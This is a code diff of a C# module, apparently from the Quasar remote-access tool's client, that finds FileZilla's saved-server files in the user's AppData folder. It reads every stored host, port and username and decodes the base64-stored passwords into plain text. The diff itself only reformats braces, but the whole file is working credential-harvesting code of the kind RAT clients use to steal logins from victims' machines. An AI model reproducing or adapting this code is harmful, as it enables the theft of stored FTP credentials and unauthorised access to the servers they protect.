@@ -5,34 +5,27 @@ using System.Text;
 using System.Xml;
 using Quasar.Common.Models;
 
-namespace Quasar.Client.Recovery.FtpClients
-{
-    public class FileZilla
-    {
+namespace Quasar.Client.Recovery.FtpClients {
+    public class FileZilla {
         public static string RecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
         public static string SiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
 
-        public static List<RecoveredAccount> GetSavedPasswords()
-        {
+        public static List<RecoveredAccount> GetSavedPasswords() {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
-            try
-            {
+            try {
                 if (!File.Exists(RecentServerPath) && !File.Exists(SiteManagerPath))
                     return data;
 
-                if (File.Exists(RecentServerPath))
-                {
+                if (File.Exists(RecentServerPath)) {
                     XmlTextReader xmlTReader = new XmlTextReader(RecentServerPath);
                     XmlDocument xmlDoc = new XmlDocument();
                     xmlDoc.Load(xmlTReader);
 
-                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
-                    {
+                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes) {
                         string szHost = string.Empty;
                         string szUsername = string.Empty;
                         string szPassword = string.Empty;
-                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
-                        {
+                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes) {
                             if (xmlNodeChild.Name == "Host")
                                 szHost = xmlNodeChild.InnerText;
                             if (xmlNodeChild.Name == "Port")
@@ -43,8 +36,7 @@ namespace Quasar.Client.Recovery.FtpClients
                                 szPassword = Base64Decode(xmlNodeChild.InnerText);
                         }
 
-                        data.Add(new RecoveredAccount
-                        {
+                        data.Add(new RecoveredAccount {
                             Url = szHost,
                             Username = szUsername,
                             Password = szPassword,
@@ -53,19 +45,16 @@ namespace Quasar.Client.Recovery.FtpClients
                     }
                 }
 
-                if (File.Exists(SiteManagerPath))
-                {
+                if (File.Exists(SiteManagerPath)) {
                     XmlTextReader xmlTReader = new XmlTextReader(SiteManagerPath);
                     XmlDocument xmlDoc = new XmlDocument();
                     xmlDoc.Load(xmlTReader);
 
-                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
-                    {
+                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes) {
                         string szHost = string.Empty;
                         string szUsername = string.Empty;
                         string szPassword = string.Empty;
-                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
-                        {
+                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes) {
                             if (xmlNodeChild.Name == "Host")
                                 szHost = xmlNodeChild.InnerText;
                             if (xmlNodeChild.Name == "Port")
@@ -76,8 +65,7 @@ namespace Quasar.Client.Recovery.FtpClients
                                 szPassword = Base64Decode(xmlNodeChild.InnerText);
                         }
 
-                        data.Add(new RecoveredAccount
-                        {
+                        data.Add(new RecoveredAccount {
                             Url = szHost,
                             Username = szUsername,
                             Password = szPassword,
@@ -86,22 +74,16 @@ namespace Quasar.Client.Recovery.FtpClients
                     }
                 }
                 return data;
-            }
-            catch
-            {
+            } catch {
                 return data;
             }
         }
 
-        public static string Base64Decode(string szInput)
-        {
-            try
-            {
+        public static string Base64Decode(string szInput) {
+            try {
                 byte[] base64ByteArray = Convert.FromBase64String(szInput);
                 return Encoding.UTF8.GetString(base64ByteArray);
-            }
-            catch
-            {
+            } catch {
                 return szInput;
             }
         }
